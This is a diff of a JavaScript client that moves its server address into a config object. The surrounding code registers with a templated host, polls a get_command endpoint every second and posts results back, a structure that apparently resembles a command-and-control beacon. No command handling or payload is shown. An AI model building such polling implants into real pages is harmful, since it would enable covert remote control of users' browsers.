@@ -30,7 +30,7 @@
         };
 
         $.ajax({
-            url: "{{ URL }}:{{ PORT }}/register/",
+            url: config.url + ':' + config.port + '/register/',
             type: "POST",
             data: formData,
             success: function (data, textStatus, jqXHR) {
@@ -48,7 +48,7 @@
     this.getCommand = function() {
 
         $.ajax({
-            url: "{{ URL }}:{{ PORT }}/get_command/" + this.id,
+            url: config.url + ':' + config.port + '/get_command/' + this.id,
             type: "GET",
             dataType: 'json',
             context: this,
@@ -87,7 +87,7 @@
     this.postBack = function(data) {
 
         $.ajax({
-            url: "{{ URL }}:{{ PORT }}/post_back/",
+            url: config.url + ':' + config.port + '/post_back/',
             type: "POST",
             data: data,
             success: function (data, textStatus, jqXHR) {
@@ -104,6 +104,8 @@
     setInterval(this.getCommand, 1000);
 
 }({
-    'debug' : true
+    'debug' : true,
+    'url' : '{{ url }}',
+    'port' : '{{ port }}'
 });
 
